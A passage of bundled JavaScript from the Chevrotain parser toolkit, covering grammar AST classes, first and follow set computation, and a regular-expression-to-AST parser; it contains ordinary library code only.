// node_modules/@chevrotain/utils/lib/src/print.js
function PRINT_ERROR(msg) {
  if (console && console.error) {
    console.error(`Error: ${msg}`);
  }
}
function PRINT_WARNING(msg) {
  if (console && console.warn) {
    console.warn(`Warning: ${msg}`);
  }
}
var init_print = __esm({
  "node_modules/@chevrotain/utils/lib/src/print.js"() {
  }
});

// node_modules/@chevrotain/utils/lib/src/timer.js
function timer(func) {
  const start = (/* @__PURE__ */ new Date()).getTime();
  const val = func();
  const end = (/* @__PURE__ */ new Date()).getTime();
  const total = end - start;
  return { time: total, value: val };
}
var init_timer = __esm({
  "node_modules/@chevrotain/utils/lib/src/timer.js"() {
  }
});

// node_modules/@chevrotain/utils/lib/src/to-fast-properties.js
function toFastProperties(toBecomeFast) {
  function FakeConstructor() {
  }
  FakeConstructor.prototype = toBecomeFast;
  const fakeInstance = new FakeConstructor();
  function fakeAccess() {
    return typeof fakeInstance.bar;
  }
  fakeAccess();
  fakeAccess();
  if (1)
    return toBecomeFast;
  (0, eval)(toBecomeFast);
}
var init_to_fast_properties = __esm({
  "node_modules/@chevrotain/utils/lib/src/to-fast-properties.js"() {
  }
});

// node_modules/@chevrotain/utils/lib/src/api.js
var init_api = __esm({
  "node_modules/@chevrotain/utils/lib/src/api.js"() {
    init_print();
    init_timer();
    init_to_fast_properties();
  }
});

// node_modules/@chevrotain/gast/lib/src/model.js
function tokenLabel(tokType) {
  if (hasTokenLabel(tokType)) {
    return tokType.LABEL;
  } else {
    return tokType.name;
  }
}
function hasTokenLabel(obj) {
  return isString_default(obj.LABEL) && obj.LABEL !== "";
}
function serializeGrammar(topRules) {
  return map_default(topRules, serializeProduction);
}
function serializeProduction(node) {
  function convertDefinition(definition) {
    return map_default(definition, serializeProduction);
  }
  if (node instanceof NonTerminal) {
    const serializedNonTerminal = {
      type: "NonTerminal",
      name: node.nonTerminalName,
      idx: node.idx
    };
    if (isString_default(node.label)) {
      serializedNonTerminal.label = node.label;
    }
    return serializedNonTerminal;
  } else if (node instanceof Alternative) {
    return {
      type: "Alternative",
      definition: convertDefinition(node.definition)
    };
  } else if (node instanceof Option) {
    return {
      type: "Option",
      idx: node.idx,
      definition: convertDefinition(node.definition)
    };
  } else if (node instanceof RepetitionMandatory) {
    return {
      type: "RepetitionMandatory",
      idx: node.idx,
      definition: convertDefinition(node.definition)
    };
  } else if (node instanceof RepetitionMandatoryWithSeparator) {
    return {
      type: "RepetitionMandatoryWithSeparator",
      idx: node.idx,
      separator: serializeProduction(new Terminal({ terminalType: node.separator })),
      definition: convertDefinition(node.definition)
    };
  } else if (node instanceof RepetitionWithSeparator) {
    return {
      type: "RepetitionWithSeparator",
      idx: node.idx,
      separator: serializeProduction(new Terminal({ terminalType: node.separator })),
      definition: convertDefinition(node.definition)
    };
  } else if (node instanceof Repetition) {
    return {
      type: "Repetition",
      idx: node.idx,
      definition: convertDefinition(node.definition)
    };
  } else if (node instanceof Alternation) {
    return {
      type: "Alternation",
      idx: node.idx,
      definition: convertDefinition(node.definition)
    };
  } else if (node instanceof Terminal) {
    const serializedTerminal = {
      type: "Terminal",
      name: node.terminalType.name,
      label: tokenLabel(node.terminalType),
      idx: node.idx
    };
    if (isString_default(node.label)) {
      serializedTerminal.terminalLabel = node.label;
    }
    const pattern = node.terminalType.PATTERN;
    if (node.terminalType.PATTERN) {
      serializedTerminal.pattern = isRegExp_default(pattern) ? pattern.source : pattern;
    }
    return serializedTerminal;
  } else if (node instanceof Rule) {
    return {
      type: "Rule",
      name: node.name,
      orgText: node.orgText,
      definition: convertDefinition(node.definition)
    };
  } else {
    throw Error("non exhaustive match");
  }
}
var AbstractProduction, NonTerminal, Rule, Alternative, Option, RepetitionMandatory, RepetitionMandatoryWithSeparator, Repetition, RepetitionWithSeparator, Alternation, Terminal;
var init_model = __esm({
  "node_modules/@chevrotain/gast/lib/src/model.js"() {
    init_lodash();
    AbstractProduction = class {
      get definition() {
        return this._definition;
      }
      set definition(value) {
        this._definition = value;
      }
      constructor(_definition) {
        this._definition = _definition;
      }
      accept(visitor) {
        visitor.visit(this);
        forEach_default(this.definition, (prod) => {
          prod.accept(visitor);
        });
      }
    };
    NonTerminal = class extends AbstractProduction {
      constructor(options) {
        super([]);
        this.idx = 1;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
      set definition(definition) {
      }
      get definition() {
        if (this.referencedRule !== void 0) {
          return this.referencedRule.definition;
        }
        return [];
      }
      accept(visitor) {
        visitor.visit(this);
      }
    };
    Rule = class extends AbstractProduction {
      constructor(options) {
        super(options.definition);
        this.orgText = "";
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    Alternative = class extends AbstractProduction {
      constructor(options) {
        super(options.definition);
        this.ignoreAmbiguities = false;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    Option = class extends AbstractProduction {
      constructor(options) {
        super(options.definition);
        this.idx = 1;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    RepetitionMandatory = class extends AbstractProduction {
      constructor(options) {
        super(options.definition);
        this.idx = 1;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    RepetitionMandatoryWithSeparator = class extends AbstractProduction {
      constructor(options) {
        super(options.definition);
        this.idx = 1;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    Repetition = class extends AbstractProduction {
      constructor(options) {
        super(options.definition);
        this.idx = 1;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    RepetitionWithSeparator = class extends AbstractProduction {
      constructor(options) {
        super(options.definition);
        this.idx = 1;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    Alternation = class extends AbstractProduction {
      get definition() {
        return this._definition;
      }
      set definition(value) {
        this._definition = value;
      }
      constructor(options) {
        super(options.definition);
        this.idx = 1;
        this.ignoreAmbiguities = false;
        this.hasPredicates = false;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
    };
    Terminal = class {
      constructor(options) {
        this.idx = 1;
        assign_default(this, pickBy_default(options, (v) => v !== void 0));
      }
      accept(visitor) {
        visitor.visit(this);
      }
    };
  }
});

// node_modules/@chevrotain/gast/lib/src/visitor.js
var GAstVisitor;
var init_visitor = __esm({
  "node_modules/@chevrotain/gast/lib/src/visitor.js"() {
    init_model();
    GAstVisitor = class {
      visit(node) {
        const nodeAny = node;
        switch (nodeAny.constructor) {
          case NonTerminal:
            return this.visitNonTerminal(nodeAny);
          case Alternative:
            return this.visitAlternative(nodeAny);
          case Option:
            return this.visitOption(nodeAny);
          case RepetitionMandatory:
            return this.visitRepetitionMandatory(nodeAny);
          case RepetitionMandatoryWithSeparator:
            return this.visitRepetitionMandatoryWithSeparator(nodeAny);
          case RepetitionWithSeparator:
            return this.visitRepetitionWithSeparator(nodeAny);
          case Repetition:
            return this.visitRepetition(nodeAny);
          case Alternation:
            return this.visitAlternation(nodeAny);
          case Terminal:
            return this.visitTerminal(nodeAny);
          case Rule:
            return this.visitRule(nodeAny);
          /* c8 ignore next 2 */
          default:
            throw Error("non exhaustive match");
        }
      }
      /* c8 ignore next */
      visitNonTerminal(node) {
      }
      /* c8 ignore next */
      visitAlternative(node) {
      }
      /* c8 ignore next */
      visitOption(node) {
      }
      /* c8 ignore next */
      visitRepetition(node) {
      }
      /* c8 ignore next */
      visitRepetitionMandatory(node) {
      }
      /* c8 ignore next 3 */
      visitRepetitionMandatoryWithSeparator(node) {
      }
      /* c8 ignore next */
      visitRepetitionWithSeparator(node) {
      }
      /* c8 ignore next */
      visitAlternation(node) {
      }
      /* c8 ignore next */
      visitTerminal(node) {
      }
      /* c8 ignore next */
      visitRule(node) {
      }
    };
  }
});

// node_modules/@chevrotain/gast/lib/src/helpers.js
function isSequenceProd(prod) {
  return prod instanceof Alternative || prod instanceof Option || prod instanceof Repetition || prod instanceof RepetitionMandatory || prod instanceof RepetitionMandatoryWithSeparator || prod instanceof RepetitionWithSeparator || prod instanceof Terminal || prod instanceof Rule;
}
function isOptionalProd(prod, alreadyVisited = []) {
  const isDirectlyOptional = prod instanceof Option || prod instanceof Repetition || prod instanceof RepetitionWithSeparator;
  if (isDirectlyOptional) {
    return true;
  }
  if (prod instanceof Alternation) {
    return some_default(prod.definition, (subProd) => {
      return isOptionalProd(subProd, alreadyVisited);
    });
  } else if (prod instanceof NonTerminal && includes_default(alreadyVisited, prod)) {
    return false;
  } else if (prod instanceof AbstractProduction) {
    if (prod instanceof NonTerminal) {
      alreadyVisited.push(prod);
    }
    return every_default(prod.definition, (subProd) => {
      return isOptionalProd(subProd, alreadyVisited);
    });
  } else {
    return false;
  }
}
function isBranchingProd(prod) {
  return prod instanceof Alternation;
}
function getProductionDslName(prod) {
  if (prod instanceof NonTerminal) {
    return "SUBRULE";
  } else if (prod instanceof Option) {
    return "OPTION";
  } else if (prod instanceof Alternation) {
    return "OR";
  } else if (prod instanceof RepetitionMandatory) {
    return "AT_LEAST_ONE";
  } else if (prod instanceof RepetitionMandatoryWithSeparator) {
    return "AT_LEAST_ONE_SEP";
  } else if (prod instanceof RepetitionWithSeparator) {
    return "MANY_SEP";
  } else if (prod instanceof Repetition) {
    return "MANY";
  } else if (prod instanceof Terminal) {
    return "CONSUME";
  } else {
    throw Error("non exhaustive match");
  }
}
var init_helpers = __esm({
  "node_modules/@chevrotain/gast/lib/src/helpers.js"() {
    init_lodash();
    init_model();
  }
});

// node_modules/@chevrotain/gast/lib/src/api.js
var init_api2 = __esm({
  "node_modules/@chevrotain/gast/lib/src/api.js"() {
    init_model();
    init_visitor();
    init_helpers();
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/rest.js
function restForRepetitionWithSeparator(repSepProd, currRest, prevRest) {
  const repSepRest = [
    new Option({
      definition: [
        new Terminal({ terminalType: repSepProd.separator })
      ].concat(repSepProd.definition)
    })
  ];
  const fullRepSepRest = repSepRest.concat(currRest, prevRest);
  return fullRepSepRest;
}
var RestWalker;
var init_rest = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/rest.js"() {
    init_lodash();
    init_api2();
    RestWalker = class {
      walk(prod, prevRest = []) {
        forEach_default(prod.definition, (subProd, index) => {
          const currRest = drop_default(prod.definition, index + 1);
          if (subProd instanceof NonTerminal) {
            this.walkProdRef(subProd, currRest, prevRest);
          } else if (subProd instanceof Terminal) {
            this.walkTerminal(subProd, currRest, prevRest);
          } else if (subProd instanceof Alternative) {
            this.walkFlat(subProd, currRest, prevRest);
          } else if (subProd instanceof Option) {
            this.walkOption(subProd, currRest, prevRest);
          } else if (subProd instanceof RepetitionMandatory) {
            this.walkAtLeastOne(subProd, currRest, prevRest);
          } else if (subProd instanceof RepetitionMandatoryWithSeparator) {
            this.walkAtLeastOneSep(subProd, currRest, prevRest);
          } else if (subProd instanceof RepetitionWithSeparator) {
            this.walkManySep(subProd, currRest, prevRest);
          } else if (subProd instanceof Repetition) {
            this.walkMany(subProd, currRest, prevRest);
          } else if (subProd instanceof Alternation) {
            this.walkOr(subProd, currRest, prevRest);
          } else {
            throw Error("non exhaustive match");
          }
        });
      }
      walkTerminal(terminal, currRest, prevRest) {
      }
      walkProdRef(refProd, currRest, prevRest) {
      }
      walkFlat(flatProd, currRest, prevRest) {
        const fullOrRest = currRest.concat(prevRest);
        this.walk(flatProd, fullOrRest);
      }
      walkOption(optionProd, currRest, prevRest) {
        const fullOrRest = currRest.concat(prevRest);
        this.walk(optionProd, fullOrRest);
      }
      walkAtLeastOne(atLeastOneProd, currRest, prevRest) {
        const fullAtLeastOneRest = [
          new Option({ definition: atLeastOneProd.definition })
        ].concat(currRest, prevRest);
        this.walk(atLeastOneProd, fullAtLeastOneRest);
      }
      walkAtLeastOneSep(atLeastOneSepProd, currRest, prevRest) {
        const fullAtLeastOneSepRest = restForRepetitionWithSeparator(atLeastOneSepProd, currRest, prevRest);
        this.walk(atLeastOneSepProd, fullAtLeastOneSepRest);
      }
      walkMany(manyProd, currRest, prevRest) {
        const fullManyRest = [
          new Option({ definition: manyProd.definition })
        ].concat(currRest, prevRest);
        this.walk(manyProd, fullManyRest);
      }
      walkManySep(manySepProd, currRest, prevRest) {
        const fullManySepRest = restForRepetitionWithSeparator(manySepProd, currRest, prevRest);
        this.walk(manySepProd, fullManySepRest);
      }
      walkOr(orProd, currRest, prevRest) {
        const fullOrRest = currRest.concat(prevRest);
        forEach_default(orProd.definition, (alt) => {
          const prodWrapper = new Alternative({ definition: [alt] });
          this.walk(prodWrapper, fullOrRest);
        });
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/first.js
function first(prod) {
  if (prod instanceof NonTerminal) {
    return first(prod.referencedRule);
  } else if (prod instanceof Terminal) {
    return firstForTerminal(prod);
  } else if (isSequenceProd(prod)) {
    return firstForSequence(prod);
  } else if (isBranchingProd(prod)) {
    return firstForBranching(prod);
  } else {
    throw Error("non exhaustive match");
  }
}
function firstForSequence(prod) {
  let firstSet = [];
  const seq = prod.definition;
  let nextSubProdIdx = 0;
  let hasInnerProdsRemaining = seq.length > nextSubProdIdx;
  let currSubProd;
  let isLastInnerProdOptional = true;
  while (hasInnerProdsRemaining && isLastInnerProdOptional) {
    currSubProd = seq[nextSubProdIdx];
    isLastInnerProdOptional = isOptionalProd(currSubProd);
    firstSet = firstSet.concat(first(currSubProd));
    nextSubProdIdx = nextSubProdIdx + 1;
    hasInnerProdsRemaining = seq.length > nextSubProdIdx;
  }
  return uniq_default(firstSet);
}
function firstForBranching(prod) {
  const allAlternativesFirsts = map_default(prod.definition, (innerProd) => {
    return first(innerProd);
  });
  return uniq_default(flatten_default(allAlternativesFirsts));
}
function firstForTerminal(terminal) {
  return [terminal.terminalType];
}
var init_first2 = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/first.js"() {
    init_lodash();
    init_api2();
  }
});

// node_modules/chevrotain/lib/src/parse/constants.js
var IN;
var init_constants = __esm({
  "node_modules/chevrotain/lib/src/parse/constants.js"() {
    IN = "_~IN~_";
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/follow.js
function computeAllProdsFollows(topProductions) {
  const reSyncFollows = {};
  forEach_default(topProductions, (topProd) => {
    const currRefsFollow = new ResyncFollowsWalker(topProd).startWalking();
    assign_default(reSyncFollows, currRefsFollow);
  });
  return reSyncFollows;
}
function buildBetweenProdsFollowPrefix(inner, occurenceInParent) {
  return inner.name + occurenceInParent + IN;
}
var ResyncFollowsWalker;
var init_follow = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/follow.js"() {
    init_rest();
    init_first2();
    init_lodash();
    init_constants();
    init_api2();
    ResyncFollowsWalker = class extends RestWalker {
      constructor(topProd) {
        super();
        this.topProd = topProd;
        this.follows = {};
      }
      startWalking() {
        this.walk(this.topProd);
        return this.follows;
      }
      walkTerminal(terminal, currRest, prevRest) {
      }
      walkProdRef(refProd, currRest, prevRest) {
        const followName = buildBetweenProdsFollowPrefix(refProd.referencedRule, refProd.idx) + this.topProd.name;
        const fullRest = currRest.concat(prevRest);
        const restProd = new Alternative({ definition: fullRest });
        const t_in_topProd_follows = first(restProd);
        this.follows[followName] = t_in_topProd_follows;
      }
    };
  }
});

// node_modules/@chevrotain/regexp-to-ast/lib/src/utils.js
function cc(char) {
  return char.charCodeAt(0);
}
function insertToSet(item, set) {
  if (Array.isArray(item)) {
    item.forEach(function(subItem) {
      set.push(subItem);
    });
  } else {
    set.push(item);
  }
}
function addFlag(flagObj, flagKey) {
  if (flagObj[flagKey] === true) {
    throw "duplicate flag " + flagKey;
  }
  const x = flagObj[flagKey];
  flagObj[flagKey] = true;
}
function ASSERT_EXISTS(obj) {
  if (obj === void 0) {
    throw Error("Internal Error - Should never get here!");
  }
  return true;
}
function ASSERT_NEVER_REACH_HERE() {
  throw Error("Internal Error - Should never get here!");
}
function isCharacter(obj) {
  return obj["type"] === "Character";
}
var init_utils = __esm({
  "node_modules/@chevrotain/regexp-to-ast/lib/src/utils.js"() {
  }
});

// node_modules/@chevrotain/regexp-to-ast/lib/src/character-classes.js
var digitsCharCodes, wordCharCodes, whitespaceCodes;
var init_character_classes = __esm({
  "node_modules/@chevrotain/regexp-to-ast/lib/src/character-classes.js"() {
    init_utils();
    digitsCharCodes = [];
    for (let i = cc("0"); i <= cc("9"); i++) {
      digitsCharCodes.push(i);
    }
    wordCharCodes = [cc("_")].concat(digitsCharCodes);
    for (let i = cc("a"); i <= cc("z"); i++) {
      wordCharCodes.push(i);
    }
    for (let i = cc("A"); i <= cc("Z"); i++) {
      wordCharCodes.push(i);
    }
    whitespaceCodes = [
      cc(" "),
      cc("\f"),
      cc("\n"),
      cc("\r"),
      cc("	"),
      cc("\v"),
      cc("	"),
      cc("\xA0"),
      cc("\u1680"),
      cc("\u2000"),
      cc("\u2001"),
      cc("\u2002"),
      cc("\u2003"),
      cc("\u2004"),
      cc("\u2005"),
      cc("\u2006"),
      cc("\u2007"),
      cc("\u2008"),
      cc("\u2009"),
      cc("\u200A"),
      cc("\u2028"),
      cc("\u2029"),
      cc("\u202F"),
      cc("\u205F"),
      cc("\u3000"),
      cc("\uFEFF")
    ];
  }
});

// node_modules/@chevrotain/regexp-to-ast/lib/src/regexp-parser.js
var hexDigitPattern, decimalPattern, decimalPatternNoZero, RegExpParser;
var init_regexp_parser = __esm({
  "node_modules/@chevrotain/regexp-to-ast/lib/src/regexp-parser.js"() {
    init_utils();
    init_character_classes();
    hexDigitPattern = /[0-9a-fA-F]/;
    decimalPattern = /[0-9]/;
    decimalPatternNoZero = /[1-9]/;
    RegExpParser = class {
      constructor() {
        this.idx = 0;
        this.input = "";
        this.groupIdx = 0;
      }
      saveState() {
        return {
          idx: this.idx,
          input: this.input,
          groupIdx: this.groupIdx
        };
      }
      restoreState(newState) {
        this.idx = newState.idx;
        this.input = newState.input;
        this.groupIdx = newState.groupIdx;
      }
      pattern(input) {
        this.idx = 0;
        this.input = input;
        this.groupIdx = 0;
        this.consumeChar("/");
        const value = this.disjunction();
        this.consumeChar("/");
        const flags = {
          type: "Flags",
          loc: { begin: this.idx, end: input.length },
          global: false,
          ignoreCase: false,
          multiLine: false,
          unicode: false,
          sticky: false
        };
        while (this.isRegExpFlag()) {
          switch (this.popChar()) {
            case "g":
              addFlag(flags, "global");
              break;
            case "i":
              addFlag(flags, "ignoreCase");
              break;
            case "m":
              addFlag(flags, "multiLine");
              break;
            case "u":
              addFlag(flags, "unicode");
              break;
            case "y":
              addFlag(flags, "sticky");
              break;
          }
        }
        if (this.idx !== this.input.length) {
          throw Error("Redundant input: " + this.input.substring(this.idx));
        }
        return {
          type: "Pattern",
          flags,
          value,
          loc: this.loc(0)
        };
      }
      disjunction() {
        const alts = [];
        const begin = this.idx;
        alts.push(this.alternative());
        while (this.peekChar() === "|") {
          this.consumeChar("|");
          alts.push(this.alternative());
        }
        return { type: "Disjunction", value: alts, loc: this.loc(begin) };
      }
      alternative() {
        const terms = [];
        const begin = this.idx;
        while (this.isTerm()) {
          terms.push(this.term());
        }
        return { type: "Alternative", value: terms, loc: this.loc(begin) };
      }
      term() {
        if (this.isAssertion()) {
          return this.assertion();
        } else {
          return this.atom();
        }
      }
      assertion() {
        const begin = this.idx;
        switch (this.popChar()) {
          case "^":
            return {
              type: "StartAnchor",
              loc: this.loc(begin)
            };
          case "$":
            return { type: "EndAnchor", loc: this.loc(begin) };
          // '\b' or '\B'
          case "\\":
            switch (this.popChar()) {
              case "b":
                return {
                  type: "WordBoundary",
                  loc: this.loc(begin)
                };
              case "B":
                return {
                  type: "NonWordBoundary",
                  loc: this.loc(begin)
                };
            }
            throw Error("Invalid Assertion Escape");
          // '(?=' or '(?!'
          case "(":
            this.consumeChar("?");
            let type;
            switch (this.popChar()) {
              case "=":
                type = "Lookahead";
                break;
              case "!":
                type = "NegativeLookahead";
                break;
              case "<": {
                switch (this.popChar()) {
                  case "=":
                    type = "Lookbehind";
                    break;
                  case "!":
                    type = "NegativeLookbehind";
                }
                break;
              }
            }
            ASSERT_EXISTS(type);
            const disjunction = this.disjunction();
            this.consumeChar(")");
            return {
              type,
              value: disjunction,
              loc: this.loc(begin)
            };
        }
        return ASSERT_NEVER_REACH_HERE();
      }
      quantifier(isBacktracking = false) {
        let range = void 0;
        const begin = this.idx;
        switch (this.popChar()) {
          case "*":
            range = {
              atLeast: 0,
              atMost: Infinity
            };
            break;
          case "+":
            range = {
              atLeast: 1,
              atMost: Infinity
            };
            break;
          case "?":
            range = {
              atLeast: 0,
              atMost: 1
            };
            break;
          case "{":
            const atLeast = this.integerIncludingZero();
            switch (this.popChar()) {
              case "}":
                range = {
                  atLeast,
                  atMost: atLeast
                };
                break;
              case ",":
                let atMost;
                if (this.isDigit()) {
                  atMost = this.integerIncludingZero();
                  range = {
                    atLeast,
                    atMost
                  };
                } else {
                  range = {
                    atLeast,
                    atMost: Infinity
                  };
                }
                this.consumeChar("}");
                break;
            }
            if (isBacktracking === true && range === void 0) {
              return void 0;
            }
            ASSERT_EXISTS(range);
            break;
        }
        if (isBacktracking === true && range === void 0) {
          return void 0;
        }
        if (ASSERT_EXISTS(range)) {
          if (this.peekChar(0) === "?") {
            this.consumeChar("?");
            range.greedy = false;
          } else {
            range.greedy = true;
          }
          range.type = "Quantifier";
          range.loc = this.loc(begin);
          return range;
        }
      }
      atom() {
        let atom;
        const begin = this.idx;
        switch (this.peekChar()) {
          case ".":
            atom = this.dotAll();
            break;
          case "\\":
            atom = this.atomEscape();
            break;
          case "[":
            atom = this.characterClass();
            break;
          case "(":
            atom = this.group();
            break;
        }
        if (atom === void 0 && this.isPatternCharacter()) {
          atom = this.patternCharacter();
        }
        if (ASSERT_EXISTS(atom)) {
          atom.loc = this.loc(begin);
          if (this.isQuantifier()) {
            atom.quantifier = this.quantifier();
          }
          return atom;
        }
        return ASSERT_NEVER_REACH_HERE();
      }
      dotAll() {
        this.consumeChar(".");
        return {
          type: "Set",
          complement: true,
          value: [cc("\n"), cc("\r"), cc("\u2028"), cc("\u2029")]
        };
      }
      atomEscape() {
        this.consumeChar("\\");
        switch (this.peekChar()) {
          case "1":
          case "2":
          case "3":
          case "4":
          case "5":
          case "6":
          case "7":
          case "8":
          case "9":
            return this.decimalEscapeAtom();
          case "d":
          case "D":
          case "s":
          case "S":
          case "w":
          case "W":
            return this.characterClassEscape();
          case "f":
          case "n":
          case "r":
          case "t":
          case "v":
            return this.controlEscapeAtom();
          case "c":
            return this.controlLetterEscapeAtom();
          case "0":
            return this.nulCharacterAtom();
          case "x":
            return this.hexEscapeSequenceAtom();
          case "u":
            return this.regExpUnicodeEscapeSequenceAtom();
          default:
            return this.identityEscapeAtom();
        }
      }
      decimalEscapeAtom() {
        const value = this.positiveInteger();
        return { type: "GroupBackReference", value };
      }
      characterClassEscape() {
        let set;
        let complement = false;
        switch (this.popChar()) {
          case "d":
            set = digitsCharCodes;
            break;
          case "D":
            set = digitsCharCodes;
            complement = true;
            break;
          case "s":
            set = whitespaceCodes;
            break;
          case "S":
            set = whitespaceCodes;
            complement = true;
            break;
          case "w":
            set = wordCharCodes;
            break;
          case "W":
            set = wordCharCodes;
            complement = true;
            break;
        }
        if (ASSERT_EXISTS(set)) {
          return { type: "Set", value: set, complement };
        }
        return ASSERT_NEVER_REACH_HERE();
      }
      controlEscapeAtom() {
        let escapeCode;
        switch (this.popChar()) {
          case "f":
            escapeCode = cc("\f");
            break;
          case "n":
            escapeCode = cc("\n");
            break;
          case "r":
            escapeCode = cc("\r");
            break;
          case "t":
            escapeCode = cc("	");
            break;
          case "v":
            escapeCode = cc("\v");
            break;
        }
        if (ASSERT_EXISTS(escapeCode)) {
          return { type: "Character", value: escapeCode };
        }
        return ASSERT_NEVER_REACH_HERE();
      }
      controlLetterEscapeAtom() {
        this.consumeChar("c");
        const letter = this.popChar();
        if (/[a-zA-Z]/.test(letter) === false) {
          throw Error("Invalid ");
        }
        const letterCode = letter.toUpperCase().charCodeAt(0) - 64;
        return { type: "Character", value: letterCode };
      }
      nulCharacterAtom() {
        this.consumeChar("0");
        return { type: "Character", value: cc("\0") };
      }
      hexEscapeSequenceAtom() {
        this.consumeChar("x");
        return this.parseHexDigits(2);
      }
      regExpUnicodeEscapeSequenceAtom() {
        this.consumeChar("u");
        return this.parseHexDigits(4);
      }
      identityEscapeAtom() {
        const escapedChar = this.popChar();
        return { type: "Character", value: cc(escapedChar) };
      }
      classPatternCharacterAtom() {
        switch (this.peekChar()) {
          // istanbul ignore next
          case "\n":
          // istanbul ignore next
          case "\r":
          // istanbul ignore next
          case "\u2028":
          // istanbul ignore next
          case "\u2029":
          // istanbul ignore next
          case "\\":
          // istanbul ignore next
          case "]":
            throw Error("TBD");
          default:
            const nextChar = this.popChar();
            return { type: "Character", value: cc(nextChar) };
        }
      }
      characterClass() {
        const set = [];
        let complement = false;
        this.consumeChar("[");
        if (this.peekChar(0) === "^") {
          this.consumeChar("^");
          complement = true;
        }
        while (this.isClassAtom()) {
          const from = this.classAtom();
          const isFromSingleChar = from.type === "Character";
          if (isCharacter(from) && this.isRangeDash()) {
            this.consumeChar("-");
            const to = this.classAtom();
            const isToSingleChar = to.type === "Character";
            if (isCharacter(to)) {
              if (to.value < from.value) {
                throw Error("Range out of order in character class");
              }
              set.push({ from: from.value, to: to.value });
            } else {
              insertToSet(from.value, set);
              set.push(cc("-"));
              insertToSet(to.value, set);
            }
          } else {
            insertToSet(from.value, set);
          }
        }
        this.consumeChar("]");
        return { type: "Set", complement, value: set };
      }
      classAtom() {
        switch (this.peekChar()) {
          // istanbul ignore next
          case "]":
          // istanbul ignore next
          case "\n":
          // istanbul ignore next
          case "\r":
          // istanbul ignore next
          case "\u2028":
          // istanbul ignore next
          case "\u2029":
            throw Error("TBD");
          case "\\":
            return this.classEscape();
          default:
            return this.classPatternCharacterAtom();
        }
      }
      classEscape() {
        this.consumeChar("\\");
        switch (this.peekChar()) {
          // Matches a backspace.
          // (Not to be confused with \b word boundary outside characterClass)
          case "b":
            this.consumeChar("b");
            return { type: "Character", value: cc("\b") };
          case "d":
          case "D":
          case "s":
          case "S":
          case "w":
          case "W":
            return this.characterClassEscape();
          case "f":
          case "n":
          case "r":
          case "t":
          case "v":
            return this.controlEscapeAtom();
          case "c":
            return this.controlLetterEscapeAtom();
          case "0":
            return this.nulCharacterAtom();
          case "x":
            return this.hexEscapeSequenceAtom();
          case "u":
            return this.regExpUnicodeEscapeSequenceAtom();
          default:
            return this.identityEscapeAtom();
        }
      }
      group() {
        let capturing = true;
        this.consumeChar("(");
        switch (this.peekChar(0)) {
          case "?":
            this.consumeChar("?");
            this.consumeChar(":");
            capturing = false;
            break;
          default:
            this.groupIdx++;
            break;
        }
        const value = this.disjunction();
        this.consumeChar(")");
        const groupAst = {
          type: "Group",
          capturing,
          value
        };
        if (capturing) {
          groupAst["idx"] = this.groupIdx;
        }
        return groupAst;
      }
      positiveInteger() {
        let number = this.popChar();
        if (decimalPatternNoZero.test(number) === false) {
          throw Error("Expecting a positive integer");
        }
        while (decimalPattern.test(this.peekChar(0))) {
          number += this.popChar();
        }
        return parseInt(number, 10);
      }
      integerIncludingZero() {
        let number = this.popChar();
        if (decimalPattern.test(number) === false) {
          throw Error("Expecting an integer");
        }
        while (decimalPattern.test(this.peekChar(0))) {
          number += this.popChar();
        }
        return parseInt(number, 10);
      }
      patternCharacter() {
        const nextChar = this.popChar();
        switch (nextChar) {
          // istanbul ignore next
          case "\n":
          // istanbul ignore next
          case "\r":
          // istanbul ignore next
          case "\u2028":
          // istanbul ignore next
          case "\u2029":
          // istanbul ignore next
          case "^":
          // istanbul ignore next
          case "$":
          // istanbul ignore next
          case "\\":
          // istanbul ignore next
          case ".":
          // istanbul ignore next
          case "*":
          // istanbul ignore next
          case "+":
          // istanbul ignore next
          case "?":
          // istanbul ignore next
          case "(":
          // istanbul ignore next
          case ")":
          // istanbul ignore next
          case "[":
          // istanbul ignore next
          case "|":
            throw Error("TBD");
          default:
            return { type: "Character", value: cc(nextChar) };
        }
      }
      isRegExpFlag() {
        switch (this.peekChar(0)) {
          case "g":
          case "i":
          case "m":
          case "u":
          case "y":
            return true;
          default:
            return false;
        }
      }
      isRangeDash() {
        return this.peekChar() === "-" && this.isClassAtom(1);
      }
      isDigit() {
        return decimalPattern.test(this.peekChar(0));
      }
      isClassAtom(howMuch = 0) {
        switch (this.peekChar(howMuch)) {
          case "]":
          case "\n":
          case "\r":
          case "\u2028":
          case "\u2029":
            return false;
          default:
            return true;
        }
      }
      isTerm() {
        return this.isAtom() || this.isAssertion();
      }
      isAtom() {
        if (this.isPatternCharacter()) {
          return true;
        }
        switch (this.peekChar(0)) {
          case ".":
          case "\\":
          // atomEscape
          case "[":
          // characterClass
          // TODO: isAtom must be called before isAssertion - disambiguate
          case "(":
            return true;
          default:
            return false;
        }
      }
      isAssertion() {
        switch (this.peekChar(0)) {
          case "^":
          case "$":
            return true;
          // '\b' or '\B'
          case "\\":
            switch (this.peekChar(1)) {
              case "b":
              case "B":
                return true;
              default:
                return false;
            }
          // '(?=' or '(?!' or `(?<=` or `(?<!`
          case "(":
            return this.peekChar(1) === "?" && (this.peekChar(2) === "=" || this.peekChar(2) === "!" || this.peekChar(2) === "<" && (this.peekChar(3) === "=" || this.peekChar(3) === "!"));
          default:
            return false;
        }
      }
      isQuantifier() {
        const prevState = this.saveState();
        try {
          return this.quantifier(true) !== void 0;
        } catch (e) {
          return false;
        } finally {
          this.restoreState(prevState);
        }
      }
      isPatternCharacter() {
        switch (this.peekChar()) {
          case "^":
          case "$":
          case "\\":
          case ".":
          case "*":
          case "+":
          case "?":
          case "(":
          case ")":
          case "[":
          case "|":
          case "/":
          case "\n":
          case "\r":
          case "\u2028":
          case "\u2029":
            return false;
          default:
            return true;
        }
      }
